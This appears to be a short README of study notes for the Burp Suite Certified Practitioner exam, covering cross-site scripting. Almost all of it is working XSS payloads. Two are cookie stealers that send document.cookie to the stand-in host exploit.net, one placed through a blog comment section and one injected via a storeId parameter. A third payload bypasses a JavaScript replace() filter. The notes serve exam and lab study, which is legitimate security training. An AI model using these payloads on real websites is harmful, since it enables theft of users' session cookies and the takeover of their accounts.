
# Burp-Suite-Certified-Practitioner-Exam-Study
Burp Suite Certified Practitioner Exam Study Notes

## Cross Site Scripting

### Cookie Stealers

Blog post comment section
```html
<img src="1" onerror="window.location='http://exploit.net/cookie='+document.cookie">
```
Product and Store lookup
```html
?productId=1&storeId="></select><img src=x onerror=this.src='http://exploit.net/?'+document.cookie;>
```
Bypass JavaScript replace()
```JavaScript
<><img src=1 onerror=alert(1)>
```